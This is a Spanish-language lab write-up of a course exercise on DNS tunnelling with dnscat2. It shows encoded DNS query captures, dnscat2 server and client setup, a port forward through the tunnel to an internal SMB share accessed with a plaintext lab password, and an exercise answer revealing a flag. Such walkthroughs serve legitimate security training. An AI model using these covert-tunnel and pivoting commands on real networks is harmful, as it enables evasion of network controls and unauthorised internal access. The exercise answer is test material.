07:22:16.751880 IP 192.168.50.64.49350 > 192.168.118.4.domain: 5272+ [1au] MX? 68fd0140b667aeb6d6d26119c3658f0cfa.feline.corp. (75)
07:22:16.752376 IP 192.168.118.4.domain > 192.168.50.64.49350: 5272 1/0/0 MX d01f0140b66950a355a6bcffff0866c42a.feline.corp. 10 (126)
07:22:17.407889 IP 192.168.50.64.50621 > 192.168.118.4.domain: 39215+ MX? cd6f0158e082e5562128b71e1353f111be.feline.corp. (64)
07:22:17.408397 IP 192.168.118.4.domain > 192.168.50.64.50621: 39215 1/0/0 MX 985d0158e00880dad6ec05ffff57240ba6.feline.corp. 10 (126)
07:22:17.762124 IP 192.168.50.64.49720 > 192.168.118.4.domain: 51139+ [1au] TXT? 49660140b6509f242f870119c47da533b7.feline.corp. (75)
07:22:17.762610 IP 192.168.118.4.domain > 192.168.50.64.49720: 51139 1/0/0 TXT "8a3d0140b6b05bb6c723aeffff0866c42a" (111)
07:22:18.417721 IP 192.168.50.64.50805 > 192.168.118.4.domain: 57236+ TXT? 3e450158e0e52d9dbf02e91e1492b9d0c5.feline.corp. (64)
07:22:18.418149 IP 192.168.118.4.domain > 192.168.50.64.50805: 57236 1/0/0 TXT "541d0158e09264101bde14ffff57240ba6" (111)
07:22:18.772152 IP 192.168.50.64.50433 > 192.168.118.4.domain: 7172+ [1au] TXT? d34f0140b6d6bd4779cb2419c56ad7d600.feline.corp. (75)
07:22:18.772847 IP 192.168.118.4.domain > 192.168.50.64.50433: 7172 1/0/0 TXT "17880140b6d23c86eaefe7ffff0866c42a" (111)
07:22:19.427556 IP 192.168.50.64.50520 > 192.168.118.4.domain: 53513+ CNAME? 8cd10158e01762c61a056c1e1537228bcc.feline.corp. (64)
07:22:19.428064 IP 192.168.118.4.domain > 192.168.50.64.50520: 53513 1/0/0 CNAME b6e10158e0a682c6c1ca43ffff57240ba6.feline.corp. (124)
07:22:19.782712 IP 192.168.50.64.50186 > 192.168.118.4.domain: 58205+ [1au] TXT? 8d5a0140b66454099e7a8119c648dffe8e.feline.corp. (75)
07:22:19.783146 IP 192.168.118.4.domain > 192.168.50.64.50186: 58205 1/0/0 TXT "2b4c0140b608687c966b10ffff0866c42a" (111)
07:22:20.438134 IP 192.168.50.64.65235 > 192.168.118.4.domain: 52335+ CNAME? b9740158e00bc5bfbe3eb81e16454173b8.feline.corp. (64)
07:22:20.438643 IP 192.168.118.4.domain > 192.168.50.64.65235: 52335 1/0/0 CNAME c0330158e07c85b2dfc880ffff57240ba6.feline.corp. (124)
07:22:20.792283 IP 192.168.50.64.50938 > 192.168.118.4.domain: 958+ [1au] TXT? b2d20140b600440d37090f19c79d9f6918.feline.corp. (75)
...
```

De este tcpdump podemos sacar dos cosas, la primera es que esta herramienta particularmente hace mucho ruido y que la información que se envía en la conexión servidor-cliente está cifrada por lo que no tiene mucho interés esnifar la conversación entre ambos puntos.

Ahora, veámos como utilizar esta conexión en nuestro beneficio. 

Primero, utilizamos el comando *window -i 1* para crear una sesión de comandos y seguidamente utilizamos '?' para listar comandos disponibles. 

```
dnscat2> windows
0 :: main [active]
  crypto-debug :: Debug window for crypto stuff [*]
  dns1 :: DNS Driver running on 0.0.0.0:53 domains = feline.corp [*]
  1 :: command (pgdatabase01) [encrypted, NOT verified] [*]
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
For added security, please ensure the client displays the same string:

>> Annoy Mona Spiced Outran Stump Visas
This is a command session!

That means you can enter a dnscat2 command such as
'ping'! For a full list of clients, try 'help'.

command (pgdatabase01) 1> ?

Here is a list of commands (use -h on any of them for additional help):
* clear
* delay
* download
* echo
* exec
* help
* listen
* ping
* qui
* se
* shell
* shutdown
* suspend
* tunnels
* unse
* upload
* window
* windows
command (pgdatabase01) 1>
```

Esto devuelve un aviso con un prefijo de "command". Podemos obtener más información sobre cada comando ejecutándolo con el indicador **--help** .

Ya que estamos tratando de hacer un túnel, investiguemos las opciones de reenvío de puertos. Podemos usar **listen** para configurar un puerto de escucha en nuestro servidor dnscat2 e impulsar el tráfico TCP a través de nuestro túnel DNS, donde será desencapsulado y enviado a un socket que especifiquemos. Pongamos en segundo plano nuestro console session presionando Ctrl + Z . Volviendo a la command session, ejecutemos **listen --help** .

```
command (pgdatabase01) 1> listen --help
Error: The user requested help
Listens on a local port and sends the connection out the other side (like ssh
	-L). Usage: listen [<lhost>:]<lport> <rhost>:<rport>
  --help, -h:   Show this message
```

De acuerdo con la salida del mensaje de ayuda, **listen** funciona de manera muy similar **a ssh -L** . Y ya deberíamos estar muy familiarizados con eso.

Intentemos conectarnos al puerto SMB en HRSHARES, esta vez a través de nuestro túnel DNS. Configuraremos un reenvío de puerto local, escuchando en 4455 en la interfaz de bucle invertido de FELINEAUTHORITY y reenviando a 445 en HRSHARES.:

```
command (pgdatabase01) 1> listen 127.0.0.1:4455 172.16.2.11:445
Listening on 127.0.0.1:4455, sending connections to 172.16.2.11:445
command (pgdatabase01) 1> 
```

Desde otro shell en FELINEAUTHORITY podemos enumerar los recursos compartidos de SMB a través de este puerto hacia adelante.

```
kali@felineauthority:~$ smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234
Password for [WORKGROUP\hr_admin]:

        Sharename       Type      Commen
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
    	scripts         Disk
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.50.63 failed (Error NT_STATUS_CONNECTION_REFUSED)
Unable to connect with SMB1 -- no workgroup available
```

La conexión es más lenta que una conexión directa, pero esto es de esperar dado que nuestros paquetes SMB se transportan a través del túnel DNS dnscat2. Los paquetes SMB basados ​​en TCP, encapsulados en solicitudes DNS y respuestas transportadas a través de UDP, hacen ping de ida y vuelta al servidor SMB en HRSHARES, en lo profundo de la red interna..

En esta unidad de aprendizaje, usamos dnscat2 para canalizar el tráfico de SMB a través de solicitudes y respuestas de DNS. Lo usamos para enumerar los recursos compartidos disponibles en un host muy dentro de la red interna, a pesar de que ni HRSHARES ni PGDATABASE01 tenían conectividad directa con nuestro servidor FELINEAUTHORITY.

<br />

**1. Follow the steps in this section to set up the dnscat2 server on FELINEAUTHORITY, and execute the dnscat2 client on PGDATABASE01. Download the binary from /exercises/dnscat_exercise_client on CONFLUENCE01. Set up a port forward with dnscat2 which allows you to run dnscat_exercise_client against the server running on port 4646 on HRSHARES.**

En primer lugar, tomamos acceso a FELINEAUTHORITY y a la PGDATABASE01 y empleamos los binarios de *dnscat* ahí disponibles para iniciar un túnel DNS:

```
kali@felineauthority:~/dns_tunneling$ dnscat2-server feline.corp
[sudo] password for kali: 

New window created: 0
dnscat2> New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 0.0.0.0:53
[domains = feline.corp]...
```

<br />

```
database_admin@pgdatabase01:~/dnscat$ ./dnscat feline.corp
Creating DNS driver:
 domain = feline.corp
 host   = 0.0.0.0
 port   = 53
 type   = TXT,CNAME,MX
 server = 127.0.0.53

Encrypted session established! For added security, please verify the server also displays this string:

Keyman Grocer Roger Stirs Plato Cleft 

Session established!
```

Después de iniciar respectivamente el servidor y el cliente en sendas máquinas se abrirá una sesión cuyos datos se trasnferirán sobre un tunel DNS. Ahora sólo queda customizar la sesión para generar un desvio de puertos a través del túnel SSH en el servidor con el siguiente comando:

```
[...]
New window created: 1
Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
For added security, please ensure the client displays the same string:

>> Keyman Grocer Roger Stirs Plato Cleft


windows
0 :: main [active]
  crypto-debug :: Debug window for crypto stuff [*]
  dns1 :: DNS Driver running on 0.0.0.0:53 domains = feline.corp [*]
  1 :: command (pgdatabase01) [encrypted, NOT verified] [*]
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
For added security, please ensure the client displays the same string:

>> Keyman Grocer Roger Stirs Plato Cleft
This is a command session!

That means you can enter a dnscat2 command such as
'ping'! For a full list of clients, try 'help'.


command (pgdatabase01) 1> listen 127.0.0.1:4455 172.16.224.217:4646
Listening on 127.0.0.1:4455, sending connections to 172.16.224.217:4646
command (pgdatabase01) 1> Connection from 127.0.0.1:44138; forwarding to 172.16.224.217:4646...
[Tunnel 0] connection successful!
```

Este comando crea un desvío de puertos a través del túnel DNS desde el puerto 4455 de FELINEAUTHORITY a través de PGDATABASE01 hasta el puerto 4646 de HRSHARES:

```
kali@felineauthority:~$ ./dnscat_exercise_client -i 127.0.0.1 -p 4455
Connecting to 127.0.0.1:4455
Flag: "OS{71c9930ffc83a05c2329f93907d16ecf}"
```
